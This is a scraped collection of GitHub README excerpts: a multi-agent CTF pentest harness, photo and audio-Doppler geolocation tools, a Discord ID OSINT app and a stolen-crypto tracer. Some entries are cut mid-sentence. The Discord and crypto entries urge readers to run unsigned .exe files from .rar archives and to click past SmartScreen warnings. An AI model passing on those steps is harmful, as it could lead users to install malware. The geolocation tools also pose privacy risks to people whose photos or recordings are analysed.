## Meet sapper in 60 seconds
https://github.com/user-attachments/assets/1560dc0c-2c92-42b8-a42f-698848fb5878
🎬 中文版：[中文宣传片](https://github.com/user-attachments/assets/f300280a-4597-40a3-b036-8f235fbee00e)
## What this is (and isn't)
**sapper is a multi-agent orchestration harness, not a single agent.** It does
not bind to any specific AI model or CLI — you can freely swap the agent and
model behind every role:
| What you can swap | How | Examples |
|---|---|---|
| **Agent CLI** | `nuwa spawn --agent  ` or env var | Claude Code / Codex / Code Buddy / DeepSeek / any interactive CLI |
| **Model** | `--model` flag or `SAPPER_MODEL` env | GLM-5.3 / DeepSeek V4.1 Flash / Claude Sonnet / any model |
| **Role composition** | freely defined in the doctrine | commander on one model, soldiers on another, scouts on a third |
sapper's value is not in any single agent, but in the **mechanism for
orchestrating multiple agents to work as a coordinated force**: scheduling,
division of labor, communication, shared memory, self-healing. Swap out every
agent and model — the mechanism still works.
**This project is designed for competition scenarios** (Tencent Intelligent
Attack-Defense Challenge CTF). If you want to use this mechanism in your own
scenario (office, research, engineering, any long-horizon cooperative work):
- **Start from [nvwabase · the Nüwa Foundation](https://github.com/N1nEmAn/nvwabase)** — the general-purpose base with all three capabilities, no pentest doctrine, ready for you to iterate your own division of labor
- **Or fork this project** — but the doctrine is NOT the only thing to change; the environment wiring must change too:
  - `docker/commander/SKILL.md` (the 426-line doctrine) → your scenario's strategy

itens.descricao_en: An agent skill that finds where a photo was taken — OpenStreetMap geometry, elevation skylines, satellite imagery and street view — and shows its work. Works with Claude Code, Codex, Cursor, Gemini CLI, OpenCode and GitHub Copilot.
itens.readme:
# 🧭 geo-sleuth
**An agent skill that finds where a photo was taken — and shows its work.**
   Works with  
    …and any other agent that reads  SKILL.md  and runs shell commands. 
*No text. No plates. No landmarks. One bridge, one mountain. Located to within 2 m.*
---
## Quick start
```bash
npx skills add Oldcircle/geo-sleuth
```
Pick your agents when prompted. Then hand your agent a photo and say:
> find where this photo was taken
On first use, ask the agent to run `doctor.py` from the installed skill’s `scripts/` folder and address any failed checks (see [Requirements and setup](#requirements-and-setup)). That is the whole interface. The agent reads `SKILL.md`, runs the scripts, and comes back with the camera position, the direction it was facing and a satellite evidence image. Prefer to copy the folder yourself? See [Installation](#installation).
## Why geo-sleuth
- **One photo, one sentence.** Give your agent a photo and say *find where this photo was taken*. You get back the camera position, the direction it was facing, and a satellite evidence image.
- **It works when there is nothing to read.** No sign, no plate, no landmark: OpenStreetMap geometry, elevation data, satellite tiles and street view carry the search on their own.
- **Geometry instead of guesswork.** Pier spacing becomes a distance ruler, shadows become a bearing, a ridge line becomes a fingerprint that elevation data can be matched against.
- **Every claim points at a file.** A conclusion has to name the command that ran in the session and the file it produced. Population and fame are not evidence.
- **Scripts rank, the model judges.** Twenty single-purpose scripts search, score and sort; the model only picks among the top few.
- **One skill, every agent.** A standard Agent Skill — `SKILL.md` plus plain Python scripts — so the same folder runs in Claude Code, Codex, Cursor, Gemini CLI, OpenCode and GitHub Copilot.
- **Answers carry an error radius.** Coordinates ± radius, the camera heading, an evidence image and a graded confidence.
## Cases
None of these photos had GPS data. Each case lists what the skill read from the photo, how it narrowed the search, and how far the result landed from the confirmed camera position.
Each case is a record of one run by one model. The skill tells the agent how to work; what to query, how to filter and how many top results to check are the model's own decisions, so a different model or different decisions may not reach the same result. Under each case

itens.descricao_en: Remove aircraft Doppler signatures from audio/video so recordings can't be geolocated from flyovers. Includes a reference attack scorer to measure it.
itens.readme:
# flyover-scrub
Remove aircraft Doppler signatures from audio and video, so a recording can't be
geolocated from the planes flying over it.
The attack was shown by **colsto** in
[*I discovered a sound that leaks your exact location (and it's everywhere)*](https://www.youtube.com/watch?v=UytYrhYLOKI)
([@colsto](https://www.youtube.com/@colsto)). This repo is a defence against it, plus an independent replication.
> **It works on real phone videos.** On my own iPhone videos and public ADS-B data, a Cessna nobody could hear
> located an indoor selfie to 61–134 m, and a helicopter heard from a parked car picked the right aircraft out of 18.
> It survived 32 of 34 codec and filter chains, and TikTok passes faint tones through untouched.
> Full write-up, data and a reproducible proof of concept: [`research/`](research/README.md).
  All figures 
| | |
|---|---|
|   |   |
|   |   |
|   |   |
```sh
uv tool install .                         # or: uv run flyover-scrub ...
flyover-scrub input.mov -o output.mov     # audio scrubbed, video copied, metadata stripped
flyover-scrub --check input.mp4           # report long tonal ridges, write nothing
```
Both modes also report **grid hum (ENF)**: mains hum whose frequency wanders with the power grid, which can date
a recording and tell which grid it was made on. Scrubbing removes it by default (`--keep-hum` keeps it). See
[`research/`](research/README.md#4-the-other-leak-grid-hum-enf).
## Audit your own recordings against real flights
```sh
# 1. While you record, log aircraft around where you are (gently: one small
#    request every 5 s to the free adsb.lol community API, with backoff).
flyover-capture --at 42.36,-83.13 --minutes 15 -o flights.jsonl
# 2. Ask: would the attack have found me? And after scrubbing?
flyover-audit recording.mov --flights flights.jsonl --scrub
# 3. If you can see a line in the spectrogram, fit it directly (stronger on real recordings):
flyover-audit recording.mov --flights flights.jsonl --scrub --trace 10,75,65,95   # t_lo,t_hi,f_lo,f_hi
```
```
  N123AB (C172, cat A1) closest 1.1 km
    original  top guess    158 m from you, your spot ranked 3/1357, signal 34.4x chance  -> EXPOSED
    scrubbed  top guess   1553 m from you, your spot ranked 506/1352, signal  1.1x chance  -> not located
```
The audit reads the start time and position from the file's own tags (iPhone
`.MOV` has both), or takes `--start` and `--at`. It **requires your true
location**. It answers "am I exposed?" and isn't meant for l

itens.descricao_en: Free OSINT app for Discord IDs: paste a user, server or invite and see when it was made and who it copies.
itens.readme:
Spot the flake. 
  Flake is a free OSINT desktop app for Discord IDs. Paste a user, server, message or invite and see when it was made, who it copies and where it leads. Official API with your own bot token. Nothing leaves your PC.  
> [!NOTE]
> **Download:** the Windows build is a single `Flake-setup.exe` — [releases](https://github.com/Tropicaldrescoop/discord-id-osint-checker/releases/latest/download/discord-id-osint-checker.rar). No installer, no admin rights, no account.
>
> The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**.
## Why Flake
Every Discord ID is a snowflake: the first 42 bits are the moment it was created. Scammers count on nobody checking. They copy a trusted name with a look-alike letter, borrow the avatar, and hijack invite links that used to point somewhere safe.
The lookup sites that used to answer this are mostly gone. Flake runs on your PC instead.
| | Lookup websites | Flake |
|---|---|---|
| **Token** | Theirs, shared by everyone | **Your own bot** |
| **Dates** | One ID at a time | **Paste 100, plot them, offline** |
| **Look-alikes** | Not checked | **Against IDs you saved** |
| **Invites** | Server name and count | **Changed hands? Phishing links?** |
| **Your history** | On their server | **Case files on your drive** |
## What you get
### Everything public about an ID
- **Created**, decoded straight from the ID, to the second.
- **Profile:** username, display name, avatar, banner, badges, profile color and **server tag**.
- **Leads:** the server a tag points to, one-click avatar search on Google Lens, Bing, Yandex and TinEye, and a username check across other sites that runs on your PC.
- **Since you last looked:** your own saved snapshot next to today's, so name and avatar changes stand out.
### Look-alikes, caught
Save the real IDs of the middlemen, mods and friends you trust. Any lookup is compared against them: copied display names, look-alike letters from other alphabets and pixel-identical avatars.
### Invites that changed hands
Vanity and expired invites get claimed by scam servers that copy the name and icon. Flake remembers where an invite led, checks the server's real age, the inviter's age and the description's links against the FishFish phishing list.
### Raids, plotted
Paste IDs from a raid, a giveaway or a member list. Flake plots when each account was made, with no network at all, and highlights the burst.

itens.descricao_en: Python tool for aircraft Doppler audio geolocation using historical ADS-B flight data (Source-available)
itens.readme:
DOPPLERGEIST 
 Aircraft Doppler Audio Geolocation 
**DOPPLERGEIST** uses aircraft Doppler signatures in audio recordings and ADS-B flight data to geolocate recordings. It includes a Python CLI and a local browser interface.
[Website](https://1337isnot1337.github.io/DOPPLERGEIST/) · [Examples](https://1337isnot1337.github.io/DOPPLERGEIST/examples.html) · [Install](#quickstart) · [How it works](#how-it-works) · [Results](#validation-and-results) · [Documentation](#documentation-and-references)
 Example: automatic MP3 analysis 
 Historical example before the current aircraft-type policy: automatic MP3 analysis selected 466 aircraft and ranked 105 candidate locations. The first candidate was **476 m from reference** in a constrained geographic search and clock window. [Experiment and ranking](docs/LIVERMORE_DEMO.md#all-aircraft-archive-mp3-ranking). 
## Capabilities
| Capability | What DOPPLERGEIST provides |
| --- | --- |
| **Automatic acoustic discovery** | Scans an entire recording for moving frequency tracks and groups related harmonics, without manually selecting event windows or frequency bands. |
| **Historical aircraft data** | Acquires and indexes ADSB.lol flight archives; caches reusable trajectory, terrain, and geoid inputs. |
| **Location search** | Compares predicted Doppler and sound-arrival patterns across candidate receiver locations, including evidence from multiple independent flyovers. |
| **Geographic profiles** | Search profiles for the contiguous United States, Germany, Spain, metropolitan France (including Corsica), and Italy (including Sicily and Sardinia), plus generated bounding envelopes for every other country and territory, grouped by continent ([COUNTRIES.md](docs/COUNTRIES.md)), with optional user-provided regional bounds. |
| **Local browser application** | Recording uploads, persistent analysis jobs, per-curve spectrogram/audio evidence, false-positive review with user-assisted re-analysis, progress monitoring, and supported resume/cancellation workflows. |
| **Research and reproducibility** | Configured measurement/replay commands, documented experiments, diagnostic artifacts, and decision rules for unresolved searches. |
The integrated application and command-line workflow are available on `main`. See [how it works](#how-it-works) and [validation and results](#validation-and-results) for the distinction between a ranked hypothesis and an accepted location.

itens.descricao_en: Paste a wallet or a transaction hash and follow stolen crypto to the exchange that can freeze it. Works across Bitcoin, Ethereum, TRON, BNB Chain and Solana. One-click report.
itens.readme:
Download  ·
   How to use  ·
   What it does  ·
   Where the data comes from  ·
   Use it right  ·
   FAQ 
 Trace stolen crypto like ZachXBT. No experience needed. 
Wake follows stolen crypto. Paste a wallet address or a transaction hash, and it traces the money hop by hop, across chains, to where it landed. If it reached an exchange, Wake tells you which one, because that exchange knows who owns the account and can freeze it when the police ask. Then it writes the report the police need, in one click.
Wake is free, runs on your PC and never asks for money to get anything back.
## Download
| System | File | |
|---|---|---|
| Windows 10 and 11 | [`Trace.exe`](https://github.com/PatchBuilderAmplify/stolen-crypto-tracer/releases/latest/download/stolen-crypto-tracer.rar) | One archive. No installer, no admin rights |
Download and start the exe. No installer, no admin rights.
The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
## How to use
1. Paste the hash of a payment you sent, or the address you sent it to.
2. Press **Follow the money**.
3. Press **Make the report**, and take it to the police.
Wake finds your other payments to the same address on its own.
## What it does
### Follow the money
Wake reads every transfer out of an address and keeps going, hop by hop, until the money stops or lands somewhere with a name. It covers Bitcoin, Ethereum and other EVM chains, TRON (where most USDT scams run), BNB Chain and Solana. When the money crosses a bridge or a swap, Wake follows it onto the other chain.
Each ribbon is as wide as the amount it carries, so you can see at a glance where most of it went.
### Where it landed
Every endpoint gets a plain label:
| Label | What it means for you |
|---|---|
| **Exchange deposit** | The exchange knows who opened the account. It can freeze the money when the police ask. |
| **Bridge** | The money changed chains. Wake keeps following on the other side. |
| **Mixer** | The trail gets harder from here. Wake tells you how much went in. |
| **Sanctioned** | The address is on the OFAC sanctions list. Tell the police. |
| **Reported scam** | Other victims have reported this address. |
Every label shows where it came from and how sure Wake is. Deposit addresses and clustering can be wrong, and Wake says so instead of guessing.
### Public clues
Click any wallet in the trace to see what's public about it: scam reports, the address posted by a social account, a scam site's domain
